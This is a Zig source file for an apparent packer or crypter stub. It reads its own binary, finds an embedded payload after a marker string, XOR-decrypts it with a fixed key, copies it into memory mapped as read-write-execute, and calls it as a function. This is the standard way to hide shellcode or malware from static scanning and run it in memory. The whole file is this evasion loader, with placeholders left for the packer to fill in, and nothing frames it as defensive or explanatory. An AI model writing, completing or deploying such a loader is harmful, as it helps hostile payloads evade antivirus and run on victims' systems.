const std = @import("std");
const decryptor = @import("decryptor.zig");
const linux = std.os.linux;

// These will be replaced by the packer
const ENCRYPTED_PAYLOAD_SIZE: usize = SIZE_PLACEHOLDER_12345678;
const DECRYPTION_KEY: u8 = 0x42;

// Payload data will be embedded here
// PAYLOAD_DATA_PLACEHOLDER

pub fn main() !void {
    const allocator = std.heap.page_allocator;

    // Get the encrypted payload from the binary
    const payload_data = get_embedded_payload();

    // Decrypt the payload
    const decrypted = try decryptor.xor_decrypt(allocator, payload_data, DECRYPTION_KEY);
    defer allocator.free(decrypted);

    // Memory mapping constants
    const PROT_READ = 0x1;
    const PROT_WRITE = 0x2;
    const PROT_EXEC = 0x4;
    const MAP_PRIVATE = 0x02;
    const MAP_ANONYMOUS = 0x20;

    // Allocate executable memory
    const mem = linux.mmap(
        null,
        decrypted.len,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS,
        -1,
        0,
    );

    if (mem == linux.MAP_FAILED) {
        return error.MemoryMapFailed;
    }

    // Copy decrypted payload to executable memory
    const dst: [*]u8 = @ptrCast(mem);
    @memcpy(dst[0..decrypted.len], decrypted);

    // Execute the payload
    const fn_ptr: *const fn () callconv(.C) void = @ptrCast(mem);
    fn_ptr();
}

fn get_embedded_payload() []const u8 {
    // Find the payload in the binary data section
    const self_binary = std.fs.cwd().readFileAlloc(std.heap.page_allocator, "/proc/self/exe", 100 * 1024 * 1024) catch return &[_]u8{};

    const marker = "PAYLOAD_START_MARKER";
    if (std.mem.indexOf(u8, self_binary, marker)) |start| {
        const payload_start = start + marker.len;
        return self_binary[payload_start .. payload_start + ENCRYPTED_PAYLOAD_SIZE];
    }
    return &[_]u8{};
}
